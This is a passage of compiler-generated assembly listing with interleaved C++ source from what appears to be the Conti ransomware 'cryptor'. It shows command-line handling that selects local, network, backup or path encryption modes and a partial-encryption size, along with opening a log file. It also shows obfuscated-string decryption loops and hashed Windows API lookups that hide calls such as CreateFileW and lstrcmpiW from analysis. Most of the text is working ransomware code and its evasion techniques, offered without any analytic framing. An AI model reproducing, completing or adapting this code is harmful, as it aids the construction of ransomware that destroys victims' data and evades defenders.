  00699	4d 8b 7c c6 08	 mov	 r15, QWORD PTR [r14+rax*8+8]
  0069e	e9 bf fd ff ff	 jmp	 $LN173@HandleComm
$LN440@HandleComm:

; 100  : 			return TRUE;

  006a3	b8 01 00 00 00	 mov	 eax, 1
  006a8	e9 c7 fe ff ff	 jmp	 $LN233@HandleComm
$LN6@HandleComm:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  006ad	c6 45 90 00	 mov	 BYTE PTR $T8[rbp-256], 0
  006b1	c6 45 91 17	 mov	 BYTE PTR $T8[rbp-255], 23
  006b5	c6 45 92 1b	 mov	 BYTE PTR $T8[rbp-254], 27
  006b9	c6 45 93 25	 mov	 BYTE PTR $T8[rbp-253], 37 ; 00000025H
  006bd	c6 45 94 1b	 mov	 BYTE PTR $T8[rbp-252], 27
  006c1	c6 45 95 6c	 mov	 BYTE PTR $T8[rbp-251], 108 ; 0000006cH
  006c5	c6 45 96 1b	 mov	 BYTE PTR $T8[rbp-250], 27
  006c9	c6 45 97 0e	 mov	 BYTE PTR $T8[rbp-249], 14
  006cd	c6 45 98 1b	 mov	 BYTE PTR $T8[rbp-248], 27
  006d1	c6 45 99 17	 mov	 BYTE PTR $T8[rbp-247], 23
  006d5	c6 45 9a 1b	 mov	 BYTE PTR $T8[rbp-246], 27
  006d9	c6 45 9b 1b	 mov	 BYTE PTR $T8[rbp-245], 27
  006dd	c6 45 9c 1b	 mov	 BYTE PTR $T8[rbp-244], 27
  006e1	0f b6 45 91	 movzx	 eax, BYTE PTR $T8[rbp-255]

; 58   :         return m_isDecrypted;

  006e5	0f b6 45 90	 movzx	 eax, BYTE PTR $T8[rbp-256]

; 63   :         if (!isDecrypted())

  006e9	84 c0		 test	 al, al
  006eb	75 54		 jne	 SHORT $LN330@HandleComm

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  006ed	4d 8b c5	 mov	 r8, r13
$LL331@HandleComm:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  006f0	42 0f b6 4c 05
	91		 movzx	 ecx, BYTE PTR $T8[rbp+r8-255]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  006f6	b8 1b 00 00 00	 mov	 eax, 27
  006fb	2b c1		 sub	 eax, ecx
  006fd	6b c8 1b	 imul	 ecx, eax, 27

; 40   :     return (a % n + n) % n;

  00700	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00705	f7 e9		 imul	 ecx
  00707	03 d1		 add	 edx, ecx
  00709	c1 fa 06	 sar	 edx, 6
  0070c	8b c2		 mov	 eax, edx
  0070e	c1 e8 1f	 shr	 eax, 31
  00711	03 d0		 add	 edx, eax
  00713	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00716	2b c8		 sub	 ecx, eax
  00718	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0071d	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00720	f7 e9		 imul	 ecx
  00722	03 d1		 add	 edx, ecx
  00724	c1 fa 06	 sar	 edx, 6
  00727	8b c2		 mov	 eax, edx
  00729	c1 e8 1f	 shr	 eax, 31
  0072c	03 d0		 add	 edx, eax
  0072e	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00731	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00733	42 88 4c 05 91	 mov	 BYTE PTR $T8[rbp+r8-255], cl
  00738	49 ff c0	 inc	 r8
  0073b	49 83 f8 0c	 cmp	 r8, 12
  0073f	72 af		 jb	 SHORT $LL331@HandleComm
$LN330@HandleComm:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 343  : 	pFunction = (INT(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xcd7328ca, 81);//GetProcAddress(hKernel32, OBFA("lstrcmpiW"));

  00741	ba 0f 00 00 00	 mov	 edx, 15
  00746	41 b8 ca 28 73
	cd		 mov	 r8d, -848090934		; cd7328caH
  0074c	44 8d 4a 42	 lea	 r9d, QWORD PTR [rdx+66]
  00750	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 344  : 	return pFunction(lpString1, lpString2);

  00755	48 8d 55 91	 lea	 rdx, QWORD PTR $T8[rbp-255]
  00759	48 8b cb	 mov	 rcx, rbx
  0075c	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 156  : 		else if (!plstrcmpiW(EncryptMode, OBFW(L"local"))) {

  0075e	85 c0		 test	 eax, eax
  00760	75 0f		 jne	 SHORT $LN8@HandleComm

; 157  : 			global::SetEncryptMode(LOCAL_ENCRYPT);

  00762	c7 05 00 00 00
	00 0b 00 00 00	 mov	 DWORD PTR ?g_EncryptMode@@3HA, 11 ; g_EncryptMode

; 158  : 		}

  0076c	e9 a3 01 00 00	 jmp	 $LN12@HandleComm
$LN8@HandleComm:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00771	c6 44 24 60 00	 mov	 BYTE PTR $T9[rsp], 0
  00776	c6 44 24 61 0e	 mov	 BYTE PTR $T9[rsp+1], 14
  0077b	c6 44 24 62 08	 mov	 BYTE PTR $T9[rsp+2], 8
  00780	c6 44 24 63 3e	 mov	 BYTE PTR $T9[rsp+3], 62	; 0000003eH
  00785	c6 44 24 64 08	 mov	 BYTE PTR $T9[rsp+4], 8
  0078a	c6 44 24 65 6d	 mov	 BYTE PTR $T9[rsp+5], 109 ; 0000006dH
  0078f	c6 44 24 66 08	 mov	 BYTE PTR $T9[rsp+6], 8
  00794	c6 44 24 67 08	 mov	 BYTE PTR $T9[rsp+7], 8
  00799	c6 44 24 68 08	 mov	 BYTE PTR $T9[rsp+8], 8
  0079e	0f b6 44 24 61	 movzx	 eax, BYTE PTR $T9[rsp+1]

; 58   :         return m_isDecrypted;

  007a3	0f b6 44 24 60	 movzx	 eax, BYTE PTR $T9[rsp]

; 63   :         if (!isDecrypted())

  007a8	84 c0		 test	 al, al
  007aa	75 58		 jne	 SHORT $LN362@HandleComm

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  007ac	4d 8b c5	 mov	 r8, r13
  007af	90		 npad	 1
$LL363@HandleComm:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  007b0	42 0f b6 4c 04
	61		 movzx	 ecx, BYTE PTR $T9[rsp+r8+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  007b6	b8 08 00 00 00	 mov	 eax, 8
  007bb	2b c1		 sub	 eax, ecx
  007bd	8d 0c 40	 lea	 ecx, DWORD PTR [rax+rax*2]

; 40   :     return (a % n + n) % n;

  007c0	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  007c5	c1 e1 03	 shl	 ecx, 3

; 40   :     return (a % n + n) % n;

  007c8	f7 e9		 imul	 ecx
  007ca	03 d1		 add	 edx, ecx
  007cc	c1 fa 06	 sar	 edx, 6
  007cf	8b c2		 mov	 eax, edx
  007d1	c1 e8 1f	 shr	 eax, 31
  007d4	03 d0		 add	 edx, eax
  007d6	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  007d9	2b c8		 sub	 ecx, eax
  007db	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  007e0	83 c1 7f	 add	 ecx, 127		; 0000007fH
  007e3	f7 e9		 imul	 ecx
  007e5	03 d1		 add	 edx, ecx
  007e7	c1 fa 06	 sar	 edx, 6
  007ea	8b c2		 mov	 eax, edx
  007ec	c1 e8 1f	 shr	 eax, 31
  007ef	03 d0		 add	 edx, eax
  007f1	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  007f4	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  007f6	42 88 4c 04 61	 mov	 BYTE PTR $T9[rsp+r8+1], cl
  007fb	49 ff c0	 inc	 r8
  007fe	49 83 f8 08	 cmp	 r8, 8
  00802	72 ac		 jb	 SHORT $LL363@HandleComm
$LN362@HandleComm:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 343  : 	pFunction = (INT(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xcd7328ca, 81);//GetProcAddress(hKernel32, OBFA("lstrcmpiW"));

  00804	ba 0f 00 00 00	 mov	 edx, 15
  00809	41 b8 ca 28 73
	cd		 mov	 r8d, -848090934		; cd7328caH
  0080f	44 8d 4a 42	 lea	 r9d, QWORD PTR [rdx+66]
  00813	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 344  : 	return pFunction(lpString1, lpString2);

  00818	48 8d 54 24 61	 lea	 rdx, QWORD PTR $T9[rsp+1]
  0081d	48 8b cb	 mov	 rcx, rbx
  00820	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 159  : 		else if (!plstrcmpiW(EncryptMode, OBFW(L"net"))) {

  00822	85 c0		 test	 eax, eax
  00824	75 0f		 jne	 SHORT $LN10@HandleComm

; 160  : 			global::SetEncryptMode(NETWORK_ENCRYPT);

  00826	c7 05 00 00 00
	00 0c 00 00 00	 mov	 DWORD PTR ?g_EncryptMode@@3HA, 12 ; g_EncryptMode

; 161  : 		}

  00830	e9 df 00 00 00	 jmp	 $LN12@HandleComm
$LN10@HandleComm:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00835	c6 45 a0 00	 mov	 BYTE PTR $T10[rbp-256], 0
  00839	c6 45 a1 2b	 mov	 BYTE PTR $T10[rbp-255], 43 ; 0000002bH
  0083d	c6 45 a2 65	 mov	 BYTE PTR $T10[rbp-254], 101 ; 00000065H
  00841	c6 45 a3 29	 mov	 BYTE PTR $T10[rbp-253], 41 ; 00000029H
  00845	c6 45 a4 65	 mov	 BYTE PTR $T10[rbp-252], 101 ; 00000065H
  00849	c6 45 a5 2d	 mov	 BYTE PTR $T10[rbp-251], 45 ; 0000002dH
  0084d	c6 45 a6 65	 mov	 BYTE PTR $T10[rbp-250], 101 ; 00000065H
  00851	c6 45 a7 3d	 mov	 BYTE PTR $T10[rbp-249], 61 ; 0000003dH
  00855	c6 45 a8 65	 mov	 BYTE PTR $T10[rbp-248], 101 ; 00000065H
  00859	c6 45 a9 51	 mov	 BYTE PTR $T10[rbp-247], 81 ; 00000051H
  0085d	c6 45 aa 65	 mov	 BYTE PTR $T10[rbp-246], 101 ; 00000065H
  00861	c6 45 ab 47	 mov	 BYTE PTR $T10[rbp-245], 71 ; 00000047H
  00865	c6 45 ac 65	 mov	 BYTE PTR $T10[rbp-244], 101 ; 00000065H
  00869	c6 45 ad 4d	 mov	 BYTE PTR $T10[rbp-243], 77 ; 0000004dH
  0086d	c6 45 ae 65	 mov	 BYTE PTR $T10[rbp-242], 101 ; 00000065H
  00871	c6 45 af 65	 mov	 BYTE PTR $T10[rbp-241], 101 ; 00000065H
  00875	c6 45 b0 65	 mov	 BYTE PTR $T10[rbp-240], 101 ; 00000065H
  00879	0f b6 45 a1	 movzx	 eax, BYTE PTR $T10[rbp-255]

; 58   :         return m_isDecrypted;

  0087d	0f b6 45 a0	 movzx	 eax, BYTE PTR $T10[rbp-256]

; 63   :         if (!isDecrypted())

  00881	84 c0		 test	 al, al
  00883	75 64		 jne	 SHORT $LN410@HandleComm

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00885	4d 8b d5	 mov	 r10, r13
  00888	0f 1f 84 00 00
	00 00 00	 npad	 8
$LL411@HandleComm:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00890	42 0f b6 4c 15
	a1		 movzx	 ecx, BYTE PTR $T10[rbp+r10-255]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00896	b8 65 00 00 00	 mov	 eax, 101		; 00000065H
  0089b	2b c1		 sub	 eax, ecx
  0089d	44 6b c8 3f	 imul	 r9d, eax, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  008a1	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  008a6	41 f7 e9	 imul	 r9d
  008a9	41 03 d1	 add	 edx, r9d
  008ac	c1 fa 06	 sar	 edx, 6
  008af	8b c2		 mov	 eax, edx
  008b1	c1 e8 1f	 shr	 eax, 31
  008b4	03 d0		 add	 edx, eax
  008b6	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  008b9	44 2b c8	 sub	 r9d, eax
  008bc	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  008c1	41 83 c1 7f	 add	 r9d, 127		; 0000007fH
  008c5	41 f7 e9	 imul	 r9d
  008c8	41 03 d1	 add	 edx, r9d
  008cb	c1 fa 06	 sar	 edx, 6
  008ce	8b c2		 mov	 eax, edx
  008d0	c1 e8 1f	 shr	 eax, 31
  008d3	03 d0		 add	 edx, eax
  008d5	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  008d8	44 2b c8	 sub	 r9d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  008db	46 88 4c 15 a1	 mov	 BYTE PTR $T10[rbp+r10-255], r9b
  008e0	49 ff c2	 inc	 r10
  008e3	49 83 fa 10	 cmp	 r10, 16
  008e7	72 a7		 jb	 SHORT $LL411@HandleComm
$LN410@HandleComm:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 343  : 	pFunction = (INT(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xcd7328ca, 81);//GetProcAddress(hKernel32, OBFA("lstrcmpiW"));

  008e9	ba 0f 00 00 00	 mov	 edx, 15
  008ee	41 b8 ca 28 73
	cd		 mov	 r8d, -848090934		; cd7328caH
  008f4	44 8d 4a 42	 lea	 r9d, QWORD PTR [rdx+66]
  008f8	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 344  : 	return pFunction(lpString1, lpString2);

  008fd	48 8d 55 a1	 lea	 rdx, QWORD PTR $T10[rbp-255]
  00901	48 8b cb	 mov	 rcx, rbx
  00904	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 162  : 		else if (!plstrcmpiW(EncryptMode, OBFW(L"backups"))) {

  00906	85 c0		 test	 eax, eax
  00908	75 0a		 jne	 SHORT $LN12@HandleComm

; 163  : 			global::SetEncryptMode(BACKUPS_ENCRYPT);

  0090a	c7 05 00 00 00
	00 0d 00 00 00	 mov	 DWORD PTR ?g_EncryptMode@@3HA, 13 ; g_EncryptMode
$LN12@HandleComm:

; 164  : 		}
; 165  : 
; 166  : 	}
; 167  : 
; 168  : 	if (Path) {

  00914	48 8b 4d d8	 mov	 rcx, QWORD PTR Path$1$[rbp-256]
  00918	48 85 c9	 test	 rcx, rcx
  0091b	74 6b		 je	 SHORT $LN280@HandleComm

; 169  : 
; 170  : 		global::SetEncryptMode(PATH_ENCRYPT);

  0091d	c7 05 00 00 00
	00 0e 00 00 00	 mov	 DWORD PTR ?g_EncryptMode@@3HA, 14 ; g_EncryptMode
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 264  :         return _CSTD wcslen(reinterpret_cast<const wchar_t*>(_First));

  00927	48 c7 c2 ff ff
	ff ff		 mov	 rdx, -1
  0092e	66 90		 npad	 2
$LL487@HandleComm:
  00930	48 ff c2	 inc	 rdx
  00933	66 83 3c 51 00	 cmp	 WORD PTR [rcx+rdx*2], 0
  00938	75 f6		 jne	 SHORT $LL487@HandleComm

; 3412 :         if (_Count <= _Mypair._Myval2._Myres) {

  0093a	48 8b 05 18 00
	00 00		 mov	 rax, QWORD PTR ?g_Path@@3V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@A+24
  00941	48 3b d0	 cmp	 rdx, rax
  00944	77 33		 ja	 SHORT $LN281@HandleComm

; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  00946	48 8d 1c 12	 lea	 rbx, QWORD PTR [rdx+rdx]

; 3415 :             _Mypair._Myval2._Mysize = _Count;

  0094a	48 89 15 10 00
	00 00		 mov	 QWORD PTR ?g_Path@@3V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@A+16, rdx

; 2244 :         return _Myres > _Small_string_capacity;

  00951	48 83 f8 07	 cmp	 rax, 7

; 2226 :         value_type* _Result = _Bx._Buf;

  00955	48 8d 3d 00 00
	00 00		 lea	 rdi, OFFSET FLAT:?g_Path@@3V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@A ; g_Path

; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  0095c	48 8b d1	 mov	 rdx, rcx
  0095f	4c 8b c3	 mov	 r8, rbx

; 2227 :         if (_Large_mode_engaged()) {

  00962	48 0f 47 3d 00
	00 00 00	 cmova	 rdi, QWORD PTR ?g_Path@@3V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@A

; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  0096a	48 8b cf	 mov	 rcx, rdi
  0096d	e8 00 00 00 00	 call	 memmove

; 3417 :             _Traits::assign(_Old_ptr[_Count], _Elem());

  00972	66 44 89 2c 3b	 mov	 WORD PTR [rbx+rdi], r13w

; 3418 :             _ASAN_STRING_CREATE(*this);
; 3419 :             return *this;

  00977	eb 0f		 jmp	 SHORT $LN280@HandleComm
$LN281@HandleComm:

; 3420 :         }
; 3421 : 
; 3422 :         return _Reallocate_for(

  00979	4c 8b c9	 mov	 r9, rcx
  0097c	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_Path@@3V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@A ; g_Path
  00983	e8 00 00 00 00	 call	 ??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
$LN280@HandleComm:
  00988	48 8b bc 24 40
	01 00 00	 mov	 rdi, QWORD PTR [rsp+320]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 175  : 	if (Size) {

  00990	4d 85 ff	 test	 r15, r15
  00993	74 0f		 je	 SHORT $LN290@HandleComm

; 176  : 
; 177  : 		INT iSize = ConvertSizeStr(Size);

  00995	49 8b cf	 mov	 rcx, r15
  00998	e8 00 00 00 00	 call	 ?ConvertSizeStr@@YAHPEA_W@Z ; ConvertSizeStr
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\global\global_parameters.cpp

; 84   : 		g_EncryptSize = 50;

  0099d	c6 05 00 00 00
	00 32		 mov	 BYTE PTR ?g_EncryptSize@@3EA, 50 ; g_EncryptSize, 00000032H
$LN290@HandleComm:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 182  : 	if (LogFile) {

  009a4	48 8b 5d e0	 mov	 rbx, QWORD PTR LogFile$1$[rbp-256]
  009a8	4c 8b bc 24 00
	01 00 00	 mov	 r15, QWORD PTR [rsp+256]
  009b0	48 85 db	 test	 rbx, rbx
  009b3	0f 84 85 00 00
	00		 je	 $LN15@HandleComm
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 423  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xddde40d3, 73);//GetProcAddress(hKernel32, OBFA("InitializeCriticalSection"));

  009b9	ba 0f 00 00 00	 mov	 edx, 15
  009be	41 b8 d3 40 de
	dd		 mov	 r8d, -572636973		; ddde40d3H
  009c4	44 8d 4a 3a	 lea	 r9d, QWORD PTR [rdx+58]
  009c8	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 424  : 	return pFunction(lpCriticalSection);

  009cd	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_CritSec@@3U_RTL_CRITICAL_SECTION@@A ; g_CritSec
  009d4	ff d0		 call	 rax

; 174  : 	pFunction = (HANDLE(WINAPI*)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x017610e8, 97);//GetProcAddress(hKernel32, OBFA("CreateFileW"));

  009d6	ba 0f 00 00 00	 mov	 edx, 15
  009db	41 b8 e8 10 76
	01		 mov	 r8d, 24514792		; 017610e8H
  009e1	44 8d 4a 52	 lea	 r9d, QWORD PTR [rdx+82]
  009e5	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 175  : 	return pFunction(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);

  009ea	45 33 c9	 xor	 r9d, r9d
  009ed	4c 89 6c 24 30	 mov	 QWORD PTR [rsp+48], r13
  009f2	c7 44 24 28 00
	00 00 80	 mov	 DWORD PTR [rsp+40], -2147483648 ; 80000000H
  009fa	ba 00 00 00 40	 mov	 edx, 1073741824		; 40000000H
  009ff	48 8b cb	 mov	 rcx, rbx
  00a02	c7 44 24 20 04
	00 00 00	 mov	 DWORD PTR [rsp+32], 4
  00a0a	45 8d 41 01	 lea	 r8d, QWORD PTR [r9+1]
  00a0e	ff d0		 call	 rax

; 1077 : 	pFunction = (DWORD(WINAPI*)(HANDLE, LONG, PLONG, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x29103c8c, 17);

  00a10	ba 0f 00 00 00	 mov	 edx, 15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp

; 10   : 	g_LogHandle = pCreateFileW(

  00a15	48 89 05 00 00
	00 00		 mov	 QWORD PTR ?g_LogHandle@@3PEAXEA, rax ; g_LogHandle
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1077 : 	pFunction = (DWORD(WINAPI*)(HANDLE, LONG, PLONG, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x29103c8c, 17);

  00a1c	41 b8 8c 3c 10
	29		 mov	 r8d, 688929932		; 29103c8cH

; 175  : 	return pFunction(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);

  00a22	48 8b d8	 mov	 rbx, rax

; 1077 : 	pFunction = (DWORD(WINAPI*)(HANDLE, LONG, PLONG, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x29103c8c, 17);

  00a25	44 8d 4a 02	 lea	 r9d, QWORD PTR [rdx+2]
  00a29	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1078 : 	return pFunction(hFile, lDistanceToMove, lpDistanceToMoveHigh, dwMoveMethod);

  00a2e	41 b9 02 00 00
	00		 mov	 r9d, 2
  00a34	45 33 c0	 xor	 r8d, r8d
  00a37	33 d2		 xor	 edx, edx
  00a39	48 8b cb	 mov	 rcx, rbx
  00a3c	ff d0		 call	 rax
$LN15@HandleComm:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 188  : 	return TRUE;

  00a3e	b8 01 00 00 00	 mov	 eax, 1
$LN1@HandleComm:

; 189  : }

  00a43	48 8b 4d f0	 mov	 rcx, QWORD PTR __$ArrayPad$[rbp-256]
  00a47	48 33 cc	 xor	 rcx, rsp
  00a4a	e8 00 00 00 00	 call	 __security_check_cookie
  00a4f	48 81 c4 08 01
	00 00		 add	 rsp, 264		; 00000108H
  00a56	41 5e		 pop	 r14
  00a58	41 5d		 pop	 r13
  00a5a	5b		 pop	 rbx
  00a5b	5d		 pop	 rbp
  00a5c	c3		 ret	 0
?HandleCommandLine@@YAHPEA_W@Z ENDP			; HandleCommandLine
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
